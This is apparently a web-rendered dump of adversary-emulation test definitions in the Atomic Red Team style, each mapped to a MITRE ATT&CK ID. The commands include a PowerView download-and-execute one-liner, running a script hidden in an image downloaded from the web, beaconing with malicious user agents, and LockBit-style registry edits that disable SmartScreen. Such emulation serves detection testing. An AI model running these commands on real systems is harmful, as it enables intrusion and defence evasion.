<li><strong>name</strong>: Get-ForestTrust with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1482</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6</li>
<li><strong>name</strong>: Embedded Script in Image Execution via Extract-Invoke-PSImage</li>
<li><strong>description</strong>: This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. 
The PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden 
within the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.</li>
</ul>
<p>The test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden 
PowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a 
separate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.</p>
<p>In the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This
is done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. </p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: cd "PathToAtomicsFolder\ExternalPayloads\"
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1"
$scriptContent = Get-Content "$HOME\result.ps1" -Raw
$base64Pattern = "(?&lt;=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $<em>.Value }
$base64Strings | Set-Content "$HOME\decoded.ps1"
$decodedContent = Get-Content "$HOME\decoded.ps1" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'<br />
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $</em>.Value }
$scriptPath = "$HOME\textExtraction.ps1"
$textMatches -join '' | Set-Content -Path $scriptPath
. "$HOME\textExtraction.ps1"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (!(Test-Path "#{image_file}")) {exit 1} else {
{exit 0}
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
Write-Output "Downloading image file..."
$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore 
Remove-Item -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore
Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore        </p>
</li>
<li>
<p><strong>mitre_id</strong>: T1001.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 21fe622f-8e53-4b31-ba83-6d333c2583f4</li>
<li><strong>name</strong>: Testing usage of uncommonly used port with PowerShell</li>
<li>
<p><strong>description</strong>: Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful
port check will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Test-NetConnection -ComputerName #{domain} -port #{port}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1571</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: {'description': 'Specify target hostname', 'type': 'string', 'default': 'google.com'}</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 81c13829-f6c9-45b8-85a6-053366d55297</li>
<li><strong>name</strong>: Malicious User Agents - Powershell</li>
<li><strong>description</strong>: This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. 
Use an application such as Wireshark to record the session and observe user agent strings and responses.</li>
</ul>
<p>Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest #{domain} -UserAgent "<em>&lt;|&gt;</em>" | out-null</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1071.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: {'description': 'Default domain to simulate against', 'type': 'string', 'default': 'www.google.com'}</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b51eae65-5441-4789-b8e8-64783c26c1d1</li>
<li><strong>name</strong>: LockBit Black - Modify Group policy settings -Powershell</li>
<li>
<p><strong>description</strong>: An adversary modifies group policy settings</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore 
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1484.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a580462d-2c19-4bc7-8b9a-57a41b7d3ba4</li>
<li><strong>name</strong>: Permission Groups Discovery PowerShell (Local)</li>
<li>
<p><strong>description</strong>: Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: get-localgroup
Get-LocalGroupMember -Name "Administrators"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 69119e58-96db-4110-ad27-954e48f3bb13</li>
<li><strong>name</strong>: WMIObject Group Discovery</li>
<li>
<p><strong>description</strong>: Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-WMIObject Win32_Group</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
